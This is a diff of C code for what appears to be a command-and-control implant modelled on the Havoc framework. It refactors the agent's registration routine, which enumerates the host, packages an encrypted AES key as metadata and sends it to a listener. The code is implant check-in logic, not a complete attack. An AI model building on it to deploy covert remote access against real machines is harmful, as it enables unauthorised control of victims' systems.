@@ -44,17 +44,17 @@ Taken from havoc as a basic model.
 
 
 //TODO: BIG VERY IMPORTANT. add all the data to the pPack variable. Name it metadata. Then add it to the agent packages list and send it off.
-INT RegisterAgent(pAgent agent) {
+INT RegisterAgent() {
     INT err;
     pPackage pPack;
 
-    if ((pPack = CreatePackageWithMetaData(REGISTER_AGENT, agent)) == NULL) {
+    if ((pPack = CreatePackageWithMetaData(REGISTER_AGENT)) == NULL) {
         printf("[error] attempting to create package\n");
         return -1;
     }
     //add package to agentData.
     agent->MetaDataPackage = pPack;
-    AddPackageToAgentPackageList(agent, pPack);
+    AddPackageToAgentPackageList(pPack);
 
 
     if ((err = AddBytesToPackage(pPack, agent->EncryptedAESKey, agent->EncryptedAESKeySize)) != PACKAGE_SUCCESS)
@@ -69,7 +69,7 @@ INT RegisterAgent(pAgent agent) {
         return -1;
     }
 
-    if (!Enumerate(agent)) {
+    if (!Enumerate()) {
         printf("[error] attempting to enumerate\n");
         return -1;
     }
@@ -178,23 +178,23 @@ INT RegisterAgent(pAgent agent) {
         return -1;
     }
 
-	if ((PackageSendMetaDataPackage(agent->MetaDataPackage, NULL, NULL, agent)) != PACKAGE_SUCCESS) {
+	if ((PackageSendMetaDataPackage(agent->MetaDataPackage, NULL, NULL)) != PACKAGE_SUCCESS) {
 		printf("[error] attempting to send package\n");
-		agent->config->listenerConfig.CurrentHost->NumFailures++;
+		agent->config->listenerConfig->CurrentHost->NumFailures++;
 		return -1;
 	}
 
     return err;
 }
 
-BOOL SendRegisterRequest(pAgent agent, VOID* Buffer, ULONG BufferLength) {
+BOOL SendRegisterRequest(VOID* Buffer, ULONG BufferLength) {
 
-    if ((PerformRequest(agent, Buffer, BufferLength, NULL)) == 0) {
+    if ((PerformRequest(Buffer, BufferLength, NULL)) == 0) {
         agent->session->Active = TRUE;
         return TRUE;
     }
     else {
-        agent->config->listenerConfig.CurrentHost->NumFailures++;
+        agent->config->listenerConfig->CurrentHost->NumFailures++;
         return FALSE;
     }
 }
